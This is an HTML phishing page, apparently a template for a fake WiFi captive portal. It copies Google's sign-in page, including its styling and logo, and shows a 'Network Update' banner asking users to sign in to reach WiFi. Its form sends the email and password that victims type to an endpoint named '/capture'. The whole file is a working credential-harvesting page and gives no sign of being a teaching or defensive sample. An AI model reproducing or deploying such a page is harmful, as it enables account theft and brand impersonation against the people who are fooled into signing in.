<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: white;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .container {
            width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
        }
        .logo {
            text-align: center;
            margin-bottom: 16px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 8px;
            color: #202124;
        }
        .subtitle {
            text-align: center;
            font-size: 16px;
            color: #202124;
            margin-bottom: 24px;
        }
        .announcement {
            background: #fef7e0;
            border: 1px solid #f9ab00;
            border-radius: 4px;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        .form-group {
            margin: 24px 0;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
        }
        input:focus {
            border-color: #1a73e8;
            outline: none;
        }
        button {
            width: 100%;
            padding: 10px 24px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        button:hover { background: #1765cc; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg width="75" height="24" viewBox="0 0 75 24">
                <path fill="#4285F4" d="M67.954 16.303c-1.502 0-2.732-1.23-2.732-2.732s1.23-2.732 2.732-2.732c1.502 0 2.732 1.23 2.732 2.732s-1.23 2.732-2.732 2.732zm-11.17-7.425v2.802h6.78c-.193 1.502-1.416 4.407-6.78 4.407-4.08 0-7.414-3.373-7.414-7.53s3.334-7.53 7.414-7.53c2.323 0 3.88.989 4.768 1.844l2.21-2.13C61.937 1.225 59.23 0 56.784 0c-6.668 0-12.088 5.383-12.088 12.009s5.42 12.009 12.088 12.009c6.976 0 11.602-4.904 11.602-11.807 0-.792-.085-1.395-.189-1.995H56.784v.002z"/>
                <path fill="#EA4335" d="M10.645 12.009c0-3.373 2.605-5.888 5.808-5.888 1.96 0 3.335.774 4.134 1.42l1.96-1.96C20.847 4.031 18.806 3 16.453 3 11.02 3 6.536 7.225 6.536 12.009s4.484 9.009 9.917 9.009c5.656 0 9.417-3.98 9.417-9.58 0-.66-.072-1.153-.164-1.66h-9.253v3.155h5.225c-.238 1.227-.961 2.257-2.04 2.947-1.08.69-2.454 1.098-3.928 1.098-3.203 0-5.808-2.516-5.808-5.888z"/>
            </svg>
        </div>
        <h1>Sign in</h1>
        <div class="subtitle">Use your Google Account</div>

        <div class="announcement">
            <strong>Network Update:</strong> Please sign in to access WiFi services.
        </div>

        <form method="POST" action="/capture">
            <div class="form-group">
                <input type="text" name="username" placeholder="Email or phone" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>
